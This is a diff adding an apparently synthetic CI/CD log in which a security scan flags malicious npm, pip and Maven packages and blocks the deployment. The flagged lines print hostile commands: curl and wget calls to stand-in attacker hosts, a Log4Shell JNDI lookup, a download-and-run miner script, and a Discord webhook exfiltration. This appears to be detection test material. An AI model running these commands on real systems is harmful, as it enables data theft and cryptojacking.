@@ -1,0 +1,46 @@
+2024-12-01T10:00:00Z [INFO] Starting CI/CD pipeline for commit abc123def
+2024-12-01T10:00:01Z [INFO] Checking out repository...
+2024-12-01T10:00:05Z [INFO] Repository checked out successfully
+2024-12-01T10:00:06Z [INFO] Installing dependencies...
+2024-12-01T10:00:07Z [INFO] Running npm install
+2024-12-01T10:00:10Z [WARN] npm WARN deprecated event-stream@3.3.6: This package is deprecated due to security issues
+2024-12-01T10:00:12Z [INFO] Installing event-stream@3.3.6
+2024-12-01T10:00:15Z [SUSPICIOUS] Package event-stream executing post-install script: curl -s http://malicious-domain.tk/collect.php
+2024-12-01T10:00:16Z [ERROR] Network request to suspicious domain detected: malicious-domain.tk
+2024-12-01T10:00:18Z [INFO] Installing flatmap-stream@0.1.1
+2024-12-01T10:00:20Z [SUSPICIOUS] Package flatmap-stream executing: eval(Buffer.from('Y29uc29sZS5sb2coJ21hbGljaW91cyBjb2RlJyk=', 'base64').toString())
+2024-12-01T10:00:22Z [WARN] Base64 encoded execution detected in package installation
+2024-12-01T10:00:25Z [INFO] Installing python3-dateutil@2.8.2
+2024-12-01T10:00:27Z [SUSPICIOUS] Package python3-dateutil attempting to access environment variables: os.environ['HOME']
+2024-12-01T10:00:28Z [SUSPICIOUS] Package python3-dateutil making network request to: http://data-collector.ml/env
+2024-12-01T10:00:30Z [INFO] Running pip install -r requirements.txt
+2024-12-01T10:00:35Z [WARN] Installing urllib4@1.26.5 (typosquat of urllib3)
+2024-12-01T10:00:37Z [SUSPICIOUS] Package urllib4 executing: import subprocess; subprocess.call(['curl', 'http://evil-server.cf/steal'])
+2024-12-01T10:00:40Z [ERROR] Suspicious subprocess execution detected
+2024-12-01T10:00:42Z [INFO] Installing Maven dependencies...
+2024-12-01T10:00:45Z [WARN] Downloading log4j-core-2.14.1.jar (vulnerable to CVE-2021-44228)
+2024-12-01T10:00:48Z [INFO] log4j-core-2.14.1.jar downloaded successfully
+2024-12-01T10:00:50Z [SUSPICIOUS] Log4j configuration attempting JNDI lookup: ${jndi:ldap://attacker.com/exploit}
+2024-12-01T10:00:52Z [ERROR] Potential Log4Shell exploit attempt detected
+2024-12-01T10:00:55Z [INFO] Running build scripts...
+2024-12-01T10:00:57Z [SUSPICIOUS] Build script executing: wget http://mining-pool.tk/miner.sh && chmod +x miner.sh && ./miner.sh
+2024-12-01T10:01:00Z [ERROR] Cryptocurrency mining script download detected
+2024-12-01T10:01:02Z [SUSPICIOUS] Process spawned: /tmp/miner.sh --pool stratum+tcp://pool.mining.com:4444
+2024-12-01T10:01:05Z [ERROR] Cryptocurrency mining activity detected
+2024-12-01T10:01:07Z [INFO] Running tests...
+2024-12-01T10:01:10Z [SUSPICIOUS] Test script accessing: document.cookie, localStorage, process.env
+2024-12-01T10:01:12Z [WARN] Potential data exfiltration in test code
+2024-12-01T10:01:15Z [SUSPICIOUS] Network request to Discord webhook: https://discord.com/api/webhooks/123456789/abcdef123456
+2024-12-01T10:01:17Z [ERROR] Data exfiltration to Discord webhook detected
+2024-12-01T10:01:20Z [INFO] Build completed with security warnings
+2024-12-01T10:01:22Z [ERROR] Security scan failed: 8 critical vulnerabilities found
+2024-12-01T10:01:25Z [WARN] Deployment blocked due to security issues
+2024-12-01T10:01:27Z [INFO] Pipeline failed with exit code 1
+
+=== Security Summary ===
+- Malicious packages detected: 5
+- Suspicious network requests: 4  
+- Cryptocurrency mining attempts: 1
+- Data exfiltration attempts: 2
+- Critical vulnerabilities: 8
+- Pipeline status: FAILED
